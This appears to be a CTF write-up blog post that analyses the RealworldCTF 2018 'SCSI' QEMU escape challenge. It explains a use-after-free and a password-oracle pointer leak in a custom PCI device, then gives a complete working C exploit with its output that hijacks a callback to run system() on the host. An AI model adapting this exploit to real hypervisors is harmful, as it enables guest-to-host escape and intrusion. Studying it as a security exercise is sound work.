---
layout: post
title: RealworldCTF 2018 - SCSI
category: [Exploitation]
tags: [Exploitation, RealworldCTF]
comments: true
hidden: false
---

Just like [babyqemu]({{site.url}}/exploitation/2018/11/22/Hitb-2017-babyqemu.html) and [q-escape]({{site.url}}/exploitation/2018/11/22/seccon-2018-q-escape.html) I did not play this ctf and probably wouldn't have been able to complete this challenge in time even if I did. Me and a couple teammates did these as exercise and I wanted to document the methods and analysis.

> [scsi.tgz]({{site.url}}/assets/scsi.tgz)

## Summary

As with the previous QEMU escape challenges the QEMU system is configured with a vulnerable PCI device. At initialization the device creates a new SCSI Bus and registers the Bus's callbacks. By interacting with the vulnerable PCI device via MMIO we are given the ability to attach other external SCSI devices to our custom Bus. Whenever SCSI request is queued on this Bus and a condition is reached for the request to be left uncompleted, the next time we create a request the Bus callbacks will free the pointer to the old request without clearing it and thus creating a UAF. If we race the system for this buffer and we manage to get control over it we can then overwrite any of the callbacks.

## Analysis

From the command line argument of the start up script we see the vulnerable PCI Device `-device ctf-scsi`. The qemu-system binary is compiled with debugging symbols so let's head over to the Local Types Subview in IDA and find the device's state structure.

{% highlight C %}
typedef struct CTFState {
  PCIDevice pdev;
  MemoryRegion mmio;
  SCSIBus bus;
  uint64_t high_addr;
  int state;
  int register_a;
  int register_b;
  int register_c;
  int pwidx;
  char pw[4];
  SCSIRequest *cur_req;
  int (*dma_read)(void *, char *, int);
  int (*dma_write)(void *, char *, int);
  CTF_req req;
  char *dma_buf;
  int dma_buf_len;
  int dma_need;
};
{% endhighlight %}

Thanks to the appropriate naming convention by the author we can search for `ctf_` in the Functions subview in IDA and see all of the associated functions with our device and the Bus it creates. Let's start by device creation `ctf_class_init`.

{% highlight C %}
void ctf_class_init(DeviceClass *a1, void *data) {
  PCIDeviceClass *ctf = (PCIDeviceClass *)object_class_dynamic_cast_assert(
                           &a1->parent_class,
                           "pci-device",
                           "hw/scsi/ctf.c",
                           361,
                           "ctf_class_init");
  ctf->realize = (void (*)(PCIDevice_0 *, Error_0 **))ctf_realize;
  ctf->vendor_id = 0x1234;
  ctf->device_id = 0x11E9;
  ctf->revision = 0;
  ctf->class_id = 0xFF;
}
{% endhighlight %}

The PCIDeviceClass properties are just helpful to us to identify the device. The `CTFState` initialization along with the MMIO and Bus creation happen in `ctf_realize`.

{% highlight C %}
void ctf_realize(CTFState *pdev, Error_0 **errp) {
  qmemcpy(pdev, pdev, 0x8E0uLL);
  pdev->state = 0;
  pdev->register_a = 0;
  pdev->register_b = 0;
  pdev->register_c = 0;
  pdev->pwidx = 0;
  pdev->dma_buf = 0LL;
  pdev->dma_buf_len = 0;
  memset(&pdev->req, 0, 0xCuLL);
  pdev->pw[0] = 'B';
  pdev->pw[1] = 'L';
  pdev->pw[2] = 'U';
  pdev->pw[3] = 'E';
  pdev->req.cmd_buf = 0LL;
  pdev->cur_req = 0LL;
  pdev->high_addr = 0LL;
  pdev->dma_need = 0;
  pdev->dma_write = (int (*)(void *, char *, int))ctf_dma_write;
  pdev->dma_read = (int (*)(void *, char *, int))ctf_dma_read;
  pci_config_set_interrupt_pin_7(pdev->pdev.config, 1u);
  memory_region_init_io(&pdev->mmio, &pdev->pdev.qdev.parent_obj, &mmio_ops_0, pdev, "ctf-scsi", 0x1000uLL);
  pci_register_bar(&pdev->pdev, 0, 0, &pdev->mmio);
  scsi_bus_new(&pdev->bus, 0x78uLL, &pdev->pdev.qdev, &ctf_scsi_info, 0LL);
}
{% endhighlight %}

We see the hardcoded password we will need to authenticate to the device with, the mmio region creation of 0x1000 bytes and the Bus creation with `scsi_bus_new` and its callbacks in `ctf_scsi_info` global. Let's start with the mmio ops.

### ctf_mmio_read

Simply allows us to read some of the state of the device.

{% highlight C %}
uint64_t ctf_mmio_read(CTFState *pdev, hwaddr addr, unsigned int size) {
  switch ( addr ) {
    case 0:
      result = pdev->state;
      break;
    case 4:
      result = pdev->high_addr;
      break;
    case 8:
      result = pdev->register_a;
      break;
    case 12:
      result = pdev->register_b;
      break;
    case 16:
      result = pdev->register_c;
      break;
    case 20:
      result = pdev->pwidx;
      break;
    case 24:
      result = pdev->dma_need;
      break;
    case 28:
      result = pdev->dma_buf_len;
      break;
    default:
      result = 0;
      break;
  }
  return result;
}
{% endhighlight %}

### ctf_mmio_write

Case 4 allows us to authenticate with the device, and with combination with `case 20` in `ctf_mmio_read` we can do a byte-by-byte brute-force past the `pw[4]` buffer and leak the `cur_req` (heap leak) and `dma_read` (elf leak) pointers.

{% highlight C %}
void ctf_mmio_write(CTFState *pdev, hwaddr addr, uint64_t val, unsigned int size) {
  switch ( addr ) {
    case 0:
      ctf_set_io(pdev, val);
      break;
    case 4:
      if ( pdev->pw[pdev->pwidx] == (_BYTE)val ) {
        if ( ++pdev->pwidx == 4 )
          pdev->state |= 1;
        } else {
        pdev->pwidx = 0;
      }
      break;
    case 8:
      ctf_process_req(pdev, (unsigned int)val);
      break;
    case 12:
      ctf_reset(pdev);
      break;
    case 16:
      pdev->register_a = val;
      break;
    case 20:
      pdev->register_b = val;
      break;
    case 24:
      ctf_process_reply(pdev);
      break;
    case 28:
      ctf_add_cmd_data(pdev, val);
      break;
    default:
      return;
  }
}
{% endhighlight %}

After we have authenticated we need to set the io status using case 0. Once we have done that we can use `ctf_process_req` which allows us to communicate with other peripheral SCSI devices via our Bus.

### ctf_process_req

{% highlight C %}

typedef struct _CTF_req_head {
    uint8_t target_id;
    uint8_t target_bus;
    uint8_t lun;
    unsigned int cdb_len;   // I renamed it
    int type;
    unsigned char cdb[0];
  } CTF_req_head;


void ctf_process_req(CTFState *pdev, uint64_t val) {
  CTF_req_head tmp;
  if ( pdev->state & 2 ) {
    hwaddr addr = val | (pdev->high_addr << 32);
    // if there is a queued SCSI request cancel it
    if ( pdev->cur_req )
      scsi_req_cancel(pdev->cur_req);
    
    // Copy the target Device identifying data
    cpu_physical_memory_read(addr, &tmp, 12);

    // Find the target SCSI device
    sdev = scsi_device_find(&pdev->bus, tmp.target_bus, tmp.target_id, tmp.lun);
    if ( sdev ) {
      pdev->state |= 0x10u;
      pdev->req.head.target_id = tmp.target_id;
      pdev->req.head.type = tmp.type;

      // Allocate space for the CDB
      pdev->req.cmd_buf = malloc(tmp.cdb_len);

      // Copy the CDB
      cpu_physical_memory_read(addr + 12, pdev->req.cmd_buf, tmp.cdb_len);

      // Create a SCSI request
      pdev->cur_req = scsi_req_new(sdev, 0, tmp.lun, (uint8_t *)pdev->req.cmd_buf, pdev);
      if ( pdev->cur_req )
      {
        // queue up the request
        if ( scsi_req_enqueue(pdev->cur_req) )
          scsi_req_continue(pdev->cur_req);
      }
    }
  }
}
{% endhighlight %}

`case 12, 16 and 20` are self-explanatory. I assume `ctf_process_reply` and `ctf_add_cmd_data` are to get the reply and write to the SCSI target, we will use them later.

## The bug

When a SCSI request is completed the `ctf_request_complete` callback is executed and when the request is cancelled `ctf_request_cancelled` is executed, we can see a potential UAF there.

{% highlight C %}
void ctf_request_complete(SCSIRequest *req) {
  CTFState *s;
  s = (CTFState *)req->hba_private;
  s->state ^= 0x10;
  free(s->req.cmd_buf);
  s->req.cmd_buf = 0;
  scsi_req_unref(req);
  s->cur_req = 0;
}

void ctf_request_cancelled(SCSIRequest *req) {
  CTFState *s;
  s = (CTFState *)req->hba_private;
  s->state ^= 0x10;
  free(s->req.cmd_buf);
  s->req.cmd_buf = 0;
  scsi_req_unref(req);
  // << Missing
}
{% endhighlight %}

To confirm we have a dangling pointer we can trace the cur_req from `ctf_mmio_write -> ctf_process_req -> scsi_req_cancel -> scsi_req_dequeue -> scsi_req_unref -> g_free`.

## Exploitation

To reach the `scsi_req_cancel` I used the following CDB.

{% highlight C %}
    CTF_req_head* head;
    //...
    head->id = 0;
    head->channel = 0;
    head->lun = 0;
    head->type = 5;
    head->cdb_len = 12;
    head->cdb[0] = 0xa0; // REPORT LUN
    head->cdb[1] = 0; // RESERVED
    head->cdb[2] = 2; // lba, need <= 2
    head->cdb[3] = 0; // RESERVED
    head->cdb[4] = 0; // RESERVED
    head->cdb[5] = 0; // RESERVED
    *(unsigned int*)&head->cdb[6] = 0x50000000; // XFER - BIG ENDIEN, need > 0xf
    head->cdb[10] = 0; // RESERVED
    head->cdb[11] = 0; // CONTROL
{% endhighlight %}

It was a bit of a struggle to find the exact CDB and it's parameters for my request to not reach a completed status because once the request has been completed by one reason or another (invalid opcodes/parameters or command for the type of device) the Bus will execute the `ctf_request_complete` callback. Which we need to avoid if we want to keep the cur_req pointer from being NULL-ed. A combination of static and dynamic analysis of [scsi_req_new](https://github.com/moyix/panda/blob/master/qemu/hw/scsi-bus.c#L472) and [scsi_target_send_command](https://github.com/moyix/panda/blob/master/qemu/hw/scsi-bus.c#L378) helped me with that.

To find out the target SCSI Device on the system we can use the following commands.

{% highlight bash %}
/ # cat /proc/scsi/scsi
Attached devices:
Host: scsi1 Channel: 00 Id: 00 Lun: 00
  Vendor: QEMU     Model: QEMU DVD-ROM     Rev: 2.5+
  Type:   CD-ROM                           ANSI  SCSI revision: 05
/ # lsscsi
[1:0:0:0]	(5)	QEMU	QEMU DVD-ROM	2.5+
{% endhighlight %}

Once we have a dangling pointer, we need to leak it using the authentication feature. This needs to be performed quickly because QEMU can allocate this buffer for something else before we get ahold of it. To control a sized allocation I used `ctf_add_cmd_data`, the function also writes into the allocated buffer at the same time, so we need to have all the leaks ready and know how to create a fake `SCSIRequest` structure so we can control it's `ops` (callbacks). In my case I used `SCSIRequest->ops->get_buf` and invoked it from `ctf_transfer_data`. See the full exploit with comments for details about each step.

## Full exploit

{% highlight C %}
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <stdbool.h>

#define PAGEMAP_LENGTH sizeof( size_t )

typedef struct _CTF_req_head {
    char id;
    char channel;
    char lun;
    int cdb_len;
    int type;
    char cdb[0];
} CTF_req_head;

unsigned int mmio_addr = 0xfebf1000;
unsigned int mmio_size = 0x1000;
char* mmio = 0;

void* devmap( size_t offset )
{
    int fd = open( "/dev/mem", O_RDWR | O_SYNC );
    if ( fd == -1 ) {
        puts( "ERROR: /dev/mem" );
        return 0;
    }

    void* result = mmap( NULL, mmio_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, mmio_addr );

    if ( !result ) {
        puts( "ERROR: mmap" );
    }

    close( fd );
    return result;
}

size_t virt_to_phys( void* addr )
{
    int fd = open( "/proc/self/pagemap", O_RDONLY );

    size_t offset = (size_t)addr / getpagesize() * PAGEMAP_LENGTH;
    lseek( fd, offset, SEEK_SET );

    size_t page_frame_number = 0;
    read( fd, &page_frame_number, PAGEMAP_LENGTH );

    page_frame_number &= 0x7FFFFFFFFFFFFF;

    close( fd );

    return ( page_frame_number << 12 ) | ( (size_t)addr & 0xfff );
}

int get_pwidx( void )
{
    return *(int*)&mmio[20];
}

void ctf_set_io( int val )
{
    *(int*)&mmio[0] = val;
}

void set_pwidx( int val )
{
    *(int*)&mmio[4] = val;
}

void ctf_process_req( int val )
{
    *(int*)&mmio[8] = val;
}

void set_register_b( int val )
{
    *(int*)&mmio[20] = val;
}

void ctf_process_reply( void )
{
    *(int*)&mmio[24] = 0;
}

void ctf_add_cmd_data( int val )
{
    *(int*)&mmio[28] = val;
}

void leak_elf( unsigned char* guessed, int size )
{
    set_pwidx( '\xff' );

    unsigned char cur = 0;
    int g_idx = 4;
    while ( true ) {
        int g;
        for ( g = 0; g < g_idx; g++ ) {
            set_pwidx( guessed[g] );
        }

        set_pwidx( cur );
        int idx = get_pwidx();
        if ( idx == 0 ) {
            cur++;
            continue;
        } else {
            guessed[g] = cur;
            g_idx++;
            cur = 0;
        }

        if ( idx == size ) {
            break;
        }
    }
}

int main( void )
{
    // mmap the mmio so we can interact with it
    mmio = devmap( mmio_addr );
    if ( !mmio ) {
        return 0;
    }

    // Allocate buffer for the CDB command and tmp space
    CTF_req_head* head = mmap( NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, 0, 0 );

    // Force physical memory assignment to it
    memset( head, 0xcc, 0x1000 );
    printf( "CTF_req_head VA: %p\n", head );

    // Convert VA to PA
    void* head_phys = (void*)virt_to_phys( head );
    printf( "CTF_req_head PA: %p\n", head_phys );

    // Authenticate with the device
    // and leak ELF
    unsigned char guessed[20] = { 0 };
    guessed[0] = 'B';
    guessed[1] = 'L';
    guessed[2] = 'U';
    guessed[3] = 'E';
    leak_elf( guessed, sizeof( guessed ) );
    size_t elf = *(size_t*)&guessed[12] - 0x50915d;
    printf( "elf : %p\n", (void*)elf );
    guessed[9] = '\x7f';

    // Set io status
    ctf_set_io( 0 );

    // Build the CDB for target SCSI Device
    head->id = 0;
    head->channel = 0;
    head->lun = 0;
    head->type = 5;
    head->cdb_len = 12;
    head->cdb[0] = 0xa0; // CMD
    head->cdb[1] = 0; // RESERVED
    head->cdb[2] = 2; // lba - 4 bytes BIG ENDIEN, <= 2
    head->cdb[3] = 0; // RESERVED
    head->cdb[4] = 0; // RESERVED
    head->cdb[5] = 0; // RESERVED
    *(unsigned int*)&head->cdb[6] = 0x50000000; // XFER - BIG ENDIEN, > 0xf
    head->cdb[10] = 0; // RESERVED
    head->cdb[11] = 0; // CONTROL

    // Unimportant but needed to avoid the next ctf_process_reply
    // from overwriting our head data
    set_register_b( (unsigned int)head_phys + 0x100 );

    // Creates and sends a SCSI request
    // _complete is triggered here because we need to force dma_buf allocation first
    ctf_process_req( head_phys );

    // Creates and sends a SCSI request
    // but because dma_buf is allocated now we avoid triggering _complete
    ctf_process_req( head_phys );

    // _reply is needed so we can clear the status & 8 flag
    // this is needed for later
    ctf_process_reply();

    // We change the target SCSI Device ID so scsi_device_find fails
    // to find a device so we dont overwrite our cur_req dangling pointer
    // with another valid pointer in ctf_process_req
    head->id = 1;

    // Prepares the argument for when we overwrite the ops->get_buf ptr
    // with system@PLT
    // at the same time it prepares the fake SCSIRequest structure
    set_register_b( (unsigned int)head_phys + 0x200 );
    char* fake_req = (char*)head + 0x200;
    strcpy( fake_req, "cat flag" );
    *(size_t*)&fake_req[0x28] = elf + 0x204948;

    // This will trigger the free of cur_req
    // then fail to find a target SCSI Device and return
    // leaving the dangling pointer
    ctf_process_req( head_phys );

    // We need quick and optimized leak of the cur_req ptr
    // before QEMU allocates this memory for something else
    leak_elf( guessed, 9 );

    // Keep preparing the fake SCSIRequest structure
    size_t req = *(size_t*)&guessed[4];
    *(size_t*)&fake_req[0x10] = req;

    // This line may slow us down
    printf( "heap: %p\n", (void*)req );

    // Here we are racing with QEMU for the cur_req ptr
    // This will request same sized chunk as the cur_req
    ctf_add_cmd_data( 0x1b0 );

    // This will trigger the fake_req->ops->get_buf call
    // which is now system@PLT
    // with argument const char* "cat flag"
    ctf_process_reply();

    // Nobody cares about this
    munmap( head, 0x1000 );
    munmap( mmio, 0x1000 );
    return 0;
}
{% endhighlight %}

{% highlight bash %}
[scsi] musl-gcc -s -static -o exploit-min exploit-min.c && cp rootfs.cpio.bak rootfs.cpio && echo exploit-min | cpio -A -H newc -ov -F rootfs.cpio
[scsi] ls -la exploit-min
-rwxr-xr-x 1 vagrant vagrant 25856 Nov 25 18:55 exploit-min
[scsi] ./start.sh
...
/ # /exploit-min
CTF_req_head VA: 0x7fb368839000
CTF_req_head PA: 0x26d1000
elf : 0x560ab77ee000
heap: 0x7fc398068a00
flagflagflag===FLAGFLAGFLAG
/ #
{% endhighlight %}